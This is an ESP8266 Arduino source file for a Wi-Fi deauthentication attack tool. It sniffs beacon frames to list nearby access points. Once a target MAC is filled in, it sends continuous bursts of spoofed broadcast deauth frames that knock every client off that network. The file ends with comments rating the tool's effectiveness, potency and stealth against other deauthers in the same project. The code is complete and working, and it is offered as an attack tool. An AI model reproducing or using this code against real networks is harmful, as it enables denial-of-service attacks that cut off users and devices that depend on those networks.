// ESP8266 Focused Deauther with Manual Target Selection
// Description:
// - Sniffs for AP beacon frames in promiscuous mode
// - If no valid MAC provided, lists nearby APs
// - If MAC set, targets only that AP with repeated deauth packets to all clients

// --- LIBRARIES ---
#include <ESP8266WiFi.h>      // Core library for ESP8266 Wi-Fi functions.
extern "C" {
  #include "user_interface.h" // Provides low-level SDK functions, including promiscuous mode and packet injection.
}

// === USER CONFIGURATION ===
// The user must manually enter the MAC address of the target Access Point here.
// If this is left empty, the device will enter a passive scanning mode.
const char* targetMACStr = ""; // e.g. "DE:AD:BE:EF:11:22"
#define DEAUTH_INTERVAL 100   // The delay in milliseconds between sending deauthentication packets.
#define SCAN_TIME 5000        // How long (in ms) to scan for APs if no target is set.

// === GLOBAL VARIABLES ===
uint8_t targetMAC[6]; // Buffer to hold the parsed MAC address in byte format.
bool macSet = false;    // Flag to indicate if a valid target MAC has been provided.
bool scanning = false;  // Flag to control the sniffer callback function.

// === DEAUTHENTICATION PACKET TEMPLATE ===
// This is the raw 802.11 deauthentication frame that will be transmitted.
// It is pre-filled with values that will be modified on the fly.
uint8_t deauthPacket[26] = {
  /* Frame Control */
  0xC0, 0x00,       // Type/Subtype: 0xC0 indicates a deauthentication frame.
  /* Duration */
  0x3A, 0x01,       // A standard duration value.
  /* Destination MAC Address */
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Set to broadcast (FF:FF:FF:FF:FF:FF) to deauthenticate all clients of the target AP.
  /* Source MAC Address (will be replaced) */
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Placeholder for the AP's MAC address.
  /* BSSID (will be replaced) */
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Placeholder for the AP's MAC address.
  /* Fragment & Sequence Number */
  0x00, 0x00,
  /* Reason Code */
  0x07, 0x00        // Reason 7: "Class 3 frame received from nonassociated STA". A common reason code for this attack.
};

// === UTILITY FUNCTION: MAC PARSING ===
// Converts a string representation of a MAC address (e.g., "DE:AD:BE:EF:11:22")
// into a 6-byte array for use in the packet.
bool parseMAC(const char* macStr, uint8_t* mac) {
  if (strlen(macStr) != 17) return false; // Basic validation.
  // sscanf is used to parse the hex values from the string.
  sscanf(macStr, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
  return true;
}

// === PROMISCUOUS CALLBACK FUNCTION (for scanning) ===
// This function is called for every Wi-Fi packet detected when in scanning mode.
void snifferCallback(uint8_t* buf, uint16_t len) {
  if (!scanning || len < 36) return; // Only process packets if we are in scanning mode.

  // Check if the packet is a Beacon Frame (0x80). Beacon frames are broadcast by APs
  // and contain the information we need.
  uint8_t frameType = buf[0];
  if ((frameType & 0xF0) == 0x80) { // Check for beacon frame.
    uint8_t* bssid = &buf[10]; // The BSSID (MAC address) is at offset 10.
    // The channel is usually at offset 36 in a beacon frame.
    Serial.printf("[SCAN] Found AP: %02X:%02X:%02X:%02X:%02X:%02X on CH%d\n",
      bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], buf[36]);
  }
}

// === UTILITY FUNCTION: PACKET MODIFICATION ===
// This function dynamically updates the deauthentication packet template with the target AP's MAC address.
void setDeauthMACs(uint8_t* mac) {
  memcpy(&deauthPacket[10], mac, 6); // Set the Source MAC address.
  memcpy(&deauthPacket[16], mac, 6); // Set the BSSID.
}

// --- SETUP FUNCTION ---
// This function runs once on boot to initialize the device.
void setup() {
  Serial.begin(115200); // Start serial for debugging output.
  WiFi.mode(WIFI_STA);  // Set the Wi-Fi mode to Station.
  delay(100);

  // Check if the user has provided a valid MAC address.
  if (strlen(targetMACStr) == 17 && parseMAC(targetMACStr, targetMAC)) {
    macSet = true;
    Serial.println("[INFO] Valid target MAC provided. Attack mode enabled.");
  } else {
    // If no valid MAC is set, enter passive scanning mode to help the user find targets.
    Serial.println("[INFO] No valid MAC provided. Entering 5-second scan mode.");
    scanning = true;
    wifi_set_promiscuous_rx_cb(snifferCallback); // Register the sniffer function.
    wifi_promiscuous_enable(1);                  // Enable promiscuous (monitor) mode.
    delay(SCAN_TIME);
    wifi_promiscuous_enable(0);                  // Disable promiscuous mode.
    scanning = false;
    Serial.println("[INFO] Scan complete. Please update targetMACStr and re-upload to attack.");
  }

  // If a target is set, configure the ESP8266 for the attack.
  if (macSet) {
    wifi_promiscuous_enable(0); // Ensure promiscuous mode is off.
    wifi_set_opmode(STATION_MODE);
    // Note: This script does not automatically switch channels. The user must ensure the ESP8266
    // is on the same channel as the target AP for the attack to work.
    wifi_set_channel(1); // Defaulting to channel 1.
    setDeauthMACs(targetMAC); // Prepare the deauth packet.
  }
}

// --- MAIN LOOP ---
// This function runs continuously, executing the attack logic.
void loop() {
  // Do nothing if no target MAC has been set.
  if (!macSet) return;

  Serial.printf("[DEAUTH] Sending deauth burst to: %02X:%02X:%02X:%02X:%02X:%02X\n",
    targetMAC[0], targetMAC[1], targetMAC[2], targetMAC[3], targetMAC[4], targetMAC[5]);

  // Send a burst of 10 deauth packets to ensure clients are disconnected.
  for (int i = 0; i < 10; i++) {
    // wifi_send_pkt_freedom is the core SDK function that sends the raw packet.
    wifi_send_pkt_freedom(deauthPacket, 26, 0);
    delay(DEAUTH_INTERVAL);
  }
  delay(1000); // Wait for 1 second before sending the next burst.
}

// --- CYBERSECURITY ANALYSIS ---
/*
 * This section provides a detailed analysis of the code from a cybersecurity perspective.
 * The scores are based on a comparison to other similar open-source projects and general
 * security principles. The scale is 1-10, where 1 is poor/simple and 10 is excellent/highly advanced.
 */

/*
 * 1. Implementation & Completeness: 4/10
 * 
 * Explanation: This is a functional but very basic deauther. It serves as a minimal proof-of-concept.
 * - Manual Targeting: The primary limitation is that it requires the user to manually edit the source code
 *   to set a target. This is inflexible and cumbersome.
 * - No Channel Hopping: The script does not automatically change the Wi-Fi channel. The user must know
 *   the target's channel and set it manually for the attack to have any effect. This is a major
 *   limitation that is handled by the more advanced scripts in this project.
 * - Helper Mode: It does include a helpful scanning mode to assist the user in finding targets, which
 *   is a good feature for a basic script.
 */

/*
 * 2. Effectiveness & Potency: 5/10
 * 
 * Explanation: When correctly configured, the attack itself is effective, but the operational limitations
 * reduce its overall potency.
 * - Standard Deauth Attack: It uses a correctly formed 802.11 deauthentication frame, which will be obeyed
 *   by most clients on networks that do not use WPA3 with Protected Management Frames (PMF).
 * - Broadcast Method: It correctly sends the deauth to the broadcast address, efficiently disconnecting
 *   all clients of the target AP without needing to know their individual MAC addresses.
 * - Single Target Limitation: Its inability to attack more than one target or to find its own targets
 *   without user intervention makes it much less potent in a real-world scenario compared to its more
 *   advanced counterparts.
 */

/*
 * 3. Stealth & Evasion: 2/10
 * 
 * Explanation: This tool is not stealthy. Its operation is obvious to any monitoring system.
 * - Deauth Flood Signature: A continuous flood of deauthentication frames is a classic sign of a Wi-Fi
 *   Denial of Service (DoS) attack and is easily detected by Wireless Intrusion Detection Systems (WIDS).
 * - Fixed Source: While the deauth packet's source address is spoofed to be the AP, the transmitting device
 *   (the ESP8266) has its own MAC address and radio signature that could potentially be identified.
 */

/*
 * 4. Sophistication & Novelty: 2/10
 * 
 * Explanation: This script demonstrates the most basic form of a deauthentication attack. The techniques
 * used are well-known and have been documented for many years.
 * - Hardcoded Logic: The reliance on a hardcoded MAC address and channel represents a very low level of
 *   sophistication.
 * - Basic SDK Use: It correctly uses the `wifi_send_pkt_freedom` function, which is the foundation of all
 *   the deauthers in this project, but it does not build any advanced logic around it.
 * It serves as a good starting point or "hello world" for Wi-Fi packet injection, but lacks the advanced
 * features seen in the other scripts.
 */
